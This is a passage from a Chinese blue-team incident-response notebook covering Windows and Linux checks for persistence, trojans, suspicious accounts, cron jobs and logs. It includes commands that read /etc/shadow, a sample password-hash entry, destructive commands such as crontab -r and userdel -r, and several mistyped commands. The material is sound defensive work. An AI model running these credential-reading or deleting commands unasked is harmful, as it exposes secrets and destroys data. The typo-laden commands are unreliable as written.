class="code"><pre><code class="hljs ada">rpm -Va<br>dpkg <span class="hljs-comment">--verify</span><br></code></pre></td></tr></table></figure><h3 id="ld-so-preload-动态链接库劫持"><a href="#ld-so-preload-动态链接库劫持" class="headerlink" title="ld.so.preload 动态链接库劫持"></a><strong>ld.so.preload 动态链接库劫持</strong></h3><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:窃取账号、密码等重要凭证<br><strong>排查要点:</strong> 检查&#x2F;etc&#x2F;ld.so.preload，ld.so(如&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so)<br><strong>操作要点:</strong> 使用静态链接的 busybox; 重启被注入恶意模块的进程，必要时直接重启系统</p><h3 id="内核态-rootkit"><a href="#内核态-rootkit" class="headerlink" title="内核态 rootkit"></a><strong>内核态 rootkit</strong></h3><p><strong>相关表现:</strong> 无明显表现<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:隐藏文件、进程等信息<br><strong>排查要点:</strong> 确定是否存在无法使用常规命令查看的文件、进程;<br><strong>操作要点:</strong> 使用 tyton 内核态 rootkit 检测工具检测:检查&#x2F;etc&#x2F;modules 是否有未知的内核模块</p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><strong>计划任务</strong></h3><p><strong>相关表现:</strong> 特定时间间隔触发木马、后门、网络链接、DNS 请求、篡改页面等行为<br><strong>相关危害:</strong> 将后门、木马持久化在系统中:周期性篡改页面、拉取数据等<br><strong>排查要点:</strong> 判断是否存在周期性出现的异常现象，检查&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;，&#x2F;etc&#x2F;cron.*等常用计划任务配置文件<br><strong>操作要点:</strong> 停止计划任务服务后再操作;注意辨别利用\r 回车符的障眼法小技巧</p><h3 id="远控木马"><a href="#远控木马" class="headerlink" title="远控木马"></a><strong>远控木马</strong></h3><p><strong>相关表现:</strong> 有持续或间断性的对外网络链接或 DNS 请求等通信行为<br><strong>相关危害:</strong> 窃取系统资料、作为跳板进一步攻击内网其他机器<br><strong>排查要点:</strong> 关注 tcp、udp、icmp 等一切网络行为，检查注册表、服务、开机目录、计划任务等一系列常见的持久化点<br><strong>操作要点:</strong> 检查网络连接，以及 IDS 设备上的异常远控告警</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h2><h3 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h3><p>1.弱口令，远程端口</p><p>2.可疑账号 <code>lusrmgr.msc</code></p><p>3.隐藏账号，克隆账号</p><p>​a.打开注册表</p><p>​b.D 盾查杀</p><p>4.日志</p><p>​a、Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>​b、导出 Windows 日志–安全，利用 Log Parser 进行分析。</p><h3 id="异常端口，进程"><a href="#异常端口，进程" class="headerlink" title="异常端口，进程"></a>异常端口，进程</h3><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li>检查方法：</li><li>a、netstat -ano 查看目前的网络连接，定位可疑的 ESTABLISHED</li><li>b、根据 netstat 定位出的 pid，再通过 tasklist 命令进行进程定位 tasklist | findstr “PID”</li></ul><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/SIj7bi47ior9pXxlTvccfOplnag.png" alt="截图"></p><p>2、进程</p><ul><li>检查方法：</li><li>a、开始–运行–输入 msinfo32，依次点击“软件环境 → 正在运行任务”就可以查看到进程的详细信息，比如进程路径、进程 ID、文件创建日期、启动时间等。</li><li>b、打开 D 盾_web 查杀工具，进程查看，关注没有签名信息的进程。</li><li>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</li><li>d、查看可疑的进程及其子进程。可以通过观察以下内容：</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">解释<br>      没有签名验证信息的进程<br>      没有描述信息的进程<br>      进程的属主<br>      进程的路径是否合法<br>      <span class="hljs-meta">CPU</span>或内存资源占用长时间过高的进程<br></code></pre></td></tr></table></figure><p>3、小技巧：</p><p>a、查看端口对应的 PID： netstat -ano | findstr “port”</p><p>b、查看进程对应的 PID：任务管理器–查看–选择列–PID 或者 tasklist | findstr “PID”</p><p>c、查看进程对应的程序位置：</p><p>任务管理器–选择对应进程–右键打开文件位置</p><p>运行输入 wmic，cmd 界面 输入 process</p><p>d、tasklist &#x2F;svc 进程–PID–服务</p><p>e、查看 Windows 服务所对应的端口：<code> %system%/system32/drivers/etc/services</code>（一般 %system% 就是 C:\Windows）</p><h3 id="启动项，计划任务，服务"><a href="#启动项，计划任务，服务" class="headerlink" title="启动项，计划任务，服务"></a>启动项，计划任务，服务</h3><p>1、检查服务器是否有异常的启动项。</p><ul><li>检查方法：</li><li>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。</li><li>b、单击开始菜单 &gt;【运行】，输入 <strong>msconfig</strong>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。</li><li>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项： <code>HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</code> 检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</li><li>d、利用安全软件查看启动项、开机时间管理等。</li><li>e、组策略，运行 gpedit.msc。</li></ul><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/QU71bN1s7oqej9xtJCRcdKvknmc.png" alt="截图"></p><p>2、检查计划任务</p><ul><li>检查方法：</li><li>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</li><li>b、单击【开始】&gt;【运行】；输入 <strong>cmd</strong>，然后输入 <strong>at</strong>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <strong>services.msc</strong>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <strong>systeminfo</strong>，查看系统信息</li></ul><p>2、查找可疑目录及文件</p><ul><li>检查方法：<ul><li>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</li><li><code> Window 2003 C:\Documents and Settings</code><br><code> Window 2008R2 C:\Users\</code></li></ul></li></ul><p>3、得到发现 WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/image-20240627162645478.png" alt="image-20240627162645478"></p><p><strong>系统日志</strong></p><ul><li>分析方法：</li><li>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</li><li>b、Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</li><li>C、导出应用程序日志、安全日志、系统日志，利用 Log Parser 进行分析。</li><li><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/SWF3b6fXyoi5UzxjU3pcmeVTneg.png" alt="截图"></li></ul><p><strong>WEB 访问日志</strong></p><ul><li>分析方法：</li><li>a、找到中间件的 web 日志，打包到本地方便进行分析。</li><li>b、推荐工具：Window 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</li><li>Linux 下，使用 Shell 命令组合查询分析</li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">获取本机用户列表: net user</span><br><span class="hljs-section">本机管理员: net localgroup administrators</span><br><span class="hljs-section">查看当前会话: net session</span><br><span class="hljs-section">查看当前运行的服务: net start</span><br><span class="hljs-section">远程连接: net use</span><br><span class="hljs-section">查看当前用户下的共享目录: net share</span><br><span class="hljs-section">最近打开的文件:</span><br>%UserProfile%\Recent<br>%APPDATA%\Microsoft\Windows\Recent<br><span class="hljs-section">查找文件中的字符串: findstr /m /i /s &quot;hello&quot; *.txt</span><br><span class="hljs-section">查看网络连接: netstat - ano</span><br><span class="hljs-section">操作系统的详细配置信息: systeminfo</span><br><span class="hljs-section">获取系统进程信息: Wmic process</span><br><span class="hljs-section">根据应用程序查找PID: wmic process where name=&quot;cmd.exe” get processid,executablepath,name</span><br><span class="hljs-section">根据PID查找应用程序: wmic process where processid=&quot;1” get executablepath,name</span><br><span class="hljs-section">获取系统进程信息:tasklist</span><br>对于要查询特定dll的调用情况，可以使用命令tasklist /m dll名称<br><span class="hljs-section">计算样本MD5: certutil -hashfile %样本文件名% MD5</span><br></code></pre></td></tr></table></figure><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a><strong>工具</strong></h3><p>病毒分析</p><p>病毒查杀</p><p>病毒动态</p><p>在线扫描</p><p>webshell 查杀</p><p><strong>PChunter</strong><br>系统信息监控工具，主要拿来看数字签名<br>黑色是微软认证的<br>粉红色是未认证的<br>红色是可疑进程</p><p><strong>Autoruns</strong><br>启动项、计划任务等动态监测工具</p><p><strong>Process Explorer</strong><br>应用程序监测工具<br>数据量很大，需要过滤</p><p><strong>TCPView</strong><br>其实就是 <code>netstat -ano</code> 的输出，但是可视化方便处理</p><p><strong>Microsoft Network Monitor</strong><br>很小的一个流量监控软件<br>安装完需要重启，可以监测单个程序进程</p><p><strong>D 盾</strong><br>查杀 webshell</p><p><strong>Everything</strong><br>快速查找文件和目录</p><p><strong>sysmon</strong><br>微软开发的系统监控工具，常用来判断挖矿后门等等</p><p><strong>火绒剑</strong></p><p><strong>威胁分析平台</strong></p><p><strong>BeaconEye</strong><br>监测 CS 木马后门特征</p><p><strong>DumpIt</strong><br>内存取证工具，需要 dump 整个系统，取证空间占用太大，不建议使用<br>替代工具:<code>FTK Imager</code> 和 <code>WinPMem</code></p><p><strong>Volatility</strong><br>内存取证工具</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><p>账号安全，历史命令，异常端口，开机启动、服务，异常文件，&#x2F;tmp&#x2F;user&#x2F;bin 目录、进程</p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**top和ps -aux**</span><br>查看系统资源占用<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**netstat -antpl**</span><br>查看网络连接以及其对应可执行程序<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**lsof**</span><br>查看开放端口的进程<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">**登录信息查看**<br><span class="hljs-section">显示错误的尝试登录信息: lastb</span><br><span class="hljs-section">显示系统用户最近的登录信息: last</span><br><span class="hljs-section">现实所有的用户最近的登录信息: lastlog</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">**<span class="hljs-keyword">grep</span>**<br>查找符合条件的字符串:netstat -antpl <span class="hljs-keyword">lgrep</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">**crontab**<br>查看定时任务: crontab -<span class="hljs-number">1</span> 、 cat <span class="hljs-regexp">/etc/</span>crontab<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">**历史命令**<br>查看历史命令: <span class="hljs-built_in">history</span>、<span class="hljs-built_in">cat</span> ~/.bash <span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile">**校验RPM软件包**<br><span class="hljs-section">校验RPM软件包: rpm -Va、dpkg -verify</span><br>S：表示对应文件的大小 (Size) 不一致<br><span class="hljs-section">M: 表示对于文件的mode不一致</span><br><span class="hljs-section">5:表示对应文件的MD5不一致</span><br><span class="hljs-section">D:表示文件的major和minor号不一致</span><br><span class="hljs-section">L:表示文件的符号连接内容不一致</span><br><span class="hljs-section">U:表示文件的owner不一致</span><br><span class="hljs-section">G: 表示文件的group不一致</span><br><span class="hljs-section">T:表示文件的修改时间不一致</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">**其它**<br>登录成功的IP<br>grep “Accepted” /var/log/secure | awk ‘&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$11</span>&#125;’ | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br>定位有爆破行为的IP<br>grep “Failed password” /var/log/secure awk ‘&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$11</span>&#125;’ | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br>查看隐藏进程<br>ps -ef awk ‘&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$11</span>&#125;’ | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> &gt;1<br><span class="hljs-built_in">ls</span> /proc | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> &gt;2<br>diff 1 2<br></code></pre></td></tr></table></figure><h3 id="账号安全-1"><a href="#账号安全-1" class="headerlink" title="账号安全"></a>账号安全</h3><p><strong>基本使用：</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">解释<br><span class="hljs-number">1</span>、用户信息文件/etc/passwd<br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">account:</span><span class="hljs-symbol">password:</span><span class="hljs-variable constant_">UID</span><span class="hljs-symbol">:GID</span><span class="hljs-symbol">:GECOS</span><span class="hljs-symbol">:directory</span><span class="hljs-symbol">:shell</span><br>用户名：密码：用户<span class="hljs-variable constant_">ID</span>：组<span class="hljs-variable constant_">ID</span>：用户说明：家目录：登陆之后shell<br>注意：无密码只允许本机登陆，远程不允许登陆<br><span class="hljs-number">2</span>、影子文件/etc/shadow<br><span class="hljs-symbol">root:</span>$<span class="hljs-number">6</span><span class="hljs-variable">$oGs1PqhL2p</span>3ZetrE<span class="hljs-variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.<span class="hljs-title class_">Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVv</span>I/<span class="hljs-symbol">:</span><span class="hljs-number">16809</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">99999</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>:<br>用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">who</span>     查看当前登录用户（<span class="hljs-built_in">tty</span>本地登陆  pts远程登录）<br>w       查看系统信息，想知道某一时刻用户的行为<br><span class="hljs-built_in">uptime</span>  查看登陆多久、多少用户，负载<br></code></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle">解释<br><span class="hljs-number">1</span>、查询特权用户特权用户(uid 为<span class="hljs-number">0</span>)<br>[root@localhost ~]# awk -F: <span class="hljs-string">&#x27;$3==0&#123;print $1&#125;&#x27;</span> <span class="hljs-regexp">/etc/</span>passwd<br><span class="hljs-number">2</span>、查询可以远程登录的帐号信息<br>[root@localhost ~]# awk <span class="hljs-string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> <span class="hljs-regexp">/etc/</span>shadow<br><span class="hljs-number">3</span>、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限<br>[root@localhost ~]# more <span class="hljs-regexp">/etc/</span>sudoers | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;^#\|^$&quot;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;ALL=(ALL)&quot;</span><br><span class="hljs-number">4</span>、禁用或删除多余及可疑的帐号<br>    usermod -L user    禁用帐号，帐号无法登录，<span class="hljs-regexp">/etc/</span>shadow第二栏为!开头<br>    userdel user       删除user用户<br>    userdel -r user    将删除user用户，并且将/home目录下的user目录一并删除<br></code></pre></td></tr></table></figure><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><p><strong>基本使用：</strong></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs clean">解释<br>通过.bash_history查看帐号执行过的系统命令<br><span class="hljs-number">1</span>、root的历史命令<br>histroy<br><span class="hljs-number">2</span>、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令<br>为历史的命令增加登录的IP地址、执行命令时间等信息：<br><span class="hljs-number">1</span>）保存<span class="hljs-number">1</span>万条命令<br>sed -i <span class="hljs-string">&#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27;</span> /etc/profile<br><span class="hljs-number">2</span>）在/etc/profile的文件尾部添加如下行数配置信息：<br>######jiagu history xianshi#########<br>USER_IP=`who -u am i <span class="hljs-number">2</span>&gt;/dev/null | awk <span class="hljs-string">&#x27;&#123;print $NF&#125;&#x27;</span> | sed -e <span class="hljs-string">&#x27;s/[()]//g&#x27;</span>`<br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$USER_IP&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ]<br>then<br>USER_IP=`hostname`<br>fi<br><span class="hljs-keyword">export</span> HISTTIMEFORMAT=<span class="hljs-string">&quot;%F %T $USER_IP `whoami` &quot;</span><br>shopt -s histappend<br><span class="hljs-keyword">export</span> PROMPT_COMMAND=<span class="hljs-string">&quot;history -a&quot;</span><br>######### jiagu history xianshi ##########<br><span class="hljs-number">3</span>）source /etc/profile让配置生效<br>生成效果： <span class="hljs-number">1</span>  <span class="hljs-number">2018</span><span class="hljs-number">-07</span><span class="hljs-number">-10</span> <span class="hljs-number">19</span>:<span class="hljs-number">45</span>:<span class="hljs-number">39</span> <span class="hljs-number">192.168</span><span class="hljs-number">.204</span><span class="hljs-number">.1</span> root source /etc/profile<br><span class="hljs-number">3</span>、历史操作命令的清除：history -c<br>但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。<br></code></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">进入用户目录下<br>cat <span class="hljs-string">.bash_history</span> &gt;&gt; <span class="hljs-keyword">history</span>.txt<br></code></pre></td></tr></table></figure><h3 id="异常端口"><a href="#异常端口" class="headerlink" title="异常端口"></a>异常端口</h3><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">netstat -antlp|more<br>查看下pid所对应的进程文件路径，<br>运行ls -l <span class="hljs-regexp">/proc/</span><span class="hljs-variable">$PID</span><span class="hljs-regexp">/exe或file /</span>proc<span class="hljs-regexp">/$PID/</span>exe（<span class="hljs-variable">$PID</span> 为对应的pid 号）<br></code></pre></td></tr></table></figure><h3 id="异常进程"><a href="#异常进程" class="headerlink" title="异常进程"></a>异常进程</h3><p>使用 ps 命令，分析进程</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> pid<br></code></pre></td></tr></table></figure><h3 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h3><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><p>查看运行级别命令 runlevel</p><p>系统默认允许级别</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">vi  /etc/inittab<br><span class="hljs-attribute">id</span><span class="hljs-operator">=</span><span class="hljs-number">3</span>：initdefault  系统开机后直接进入哪个运行级别<br></code></pre></td></tr></table></figure><p>开机启动配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>rc.local<br><span class="hljs-regexp">/etc/</span>rc.d/rc[<span class="hljs-number">0</span>~<span class="hljs-number">6</span>].d<br></code></pre></td></tr></table></figure><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在&#x2F;etc&#x2F;init.d 目录下，然后在&#x2F;etc&#x2F;rc.d&#x2F;rc*.d 中建立软链接即可</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">root@localhost ~]# ln -s <span class="hljs-regexp">/etc/i</span>nit.d<span class="hljs-regexp">/sshd /</span>etc<span class="hljs-regexp">/rc.d/</span>rc3.d/S100ssh<br></code></pre></td></tr></table></figure><p>此处 sshd 是具体服务的脚本文件，S100ssh 是其软链接，S 开头代表加载时自启动；如果是 K 开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件：</p><p>more &#x2F;etc&#x2F;rc.local &#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d </p><p>ls -l &#x2F;etc&#x2F;rc.d&#x2F;rc3.d&#x2F;</p><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p><strong>基本使用</strong></p><p>1、利用 crontab 创建计划任务</p><ul><li>基本命令</li></ul><p>crontab -l 列出某个用户 cron 服务的详细内容</p><p>Tips：默认编写的 crontab 文件会保存在 (&#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 例如: &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p><p>crontab -r 删除每个用户 cront 任务(谨慎：删除所有的计划任务)</p><p>crontab -e 使用编辑器编辑当前的 crontab 文件</p><p>如：_&#x2F;1 _* echo “hello world” &gt;&gt; &#x2F;tmp&#x2F;test.txt 每分钟写入文件</p><p>2、利用 anacron 实现异步定时任务调度</p><ul><li>使用案例</li></ul><p>每天运行 &#x2F;home&#x2F;backup.sh 脚本： vi &#x2F;etc&#x2F;anacrontab @daily 10 example.daily &#x2F;bin&#x2F;bash &#x2F;home&#x2F;backup.sh</p><p>当机器在 backup.sh 期望被运行时是关机的，anacron 会在机器开机十分钟之后运行它，而不用再等待 7 天。</p><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">解释<br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>* <br><span class="hljs-regexp">/etc/</span>crontab<br><span class="hljs-regexp">/etc/</span>cron.d/*<br><span class="hljs-regexp">/etc/</span>cron.daily/* <br><span class="hljs-regexp">/etc/</span>cron.hourly/* <br><span class="hljs-regexp">/etc/</span>cron.monthly/*<br><span class="hljs-regexp">/etc/</span>cron.weekly/<br><span class="hljs-regexp">/etc/</span>anacrontab<br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>*<br></code></pre></td></tr></table></figure><p>小技巧：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">more <span class="hljs-regexp">/etc/</span>cron.daily/*  查看目录下所有文件<br></code></pre></td></tr></table></figure><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chkconfig</span><span class="hljs-meta"> [--level 运行级别] [独立服务名] [on|off]</span><br><span class="hljs-attribute">chkconfig</span> –level  <span class="hljs-number">2345</span> httpd <span class="hljs-literal">on</span>  开启自启动<br><span class="hljs-attribute">chkconfig</span> httpd <span class="hljs-literal">on</span> （默认level是<span class="hljs-number">2345</span>）<br></code></pre></td></tr></table></figure><p>第二种修改方法：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">修改<span class="hljs-regexp">/etc/</span>re.d/rc.local 文件  <br>加入 <span class="hljs-regexp">/etc/i</span>nit.d/httpd start<br></code></pre></td></tr></table></figure><p>第三种修改方法：</p><p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM 包安装的服务</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">解释<br>chkconfig  --<span class="hljs-keyword">list</span>  查看服务自启动状态，可以看到所有的RPM包安装的服务<br><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> crond 查看当前服务<br>系统在<span class="hljs-number">3</span>与<span class="hljs-number">5</span>级别下的启动项 <br>中文环境<br>chkconfig --<span class="hljs-keyword">list</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;3:启用\|5:启用&quot;</span><br>英文环境<br>chkconfig --<span 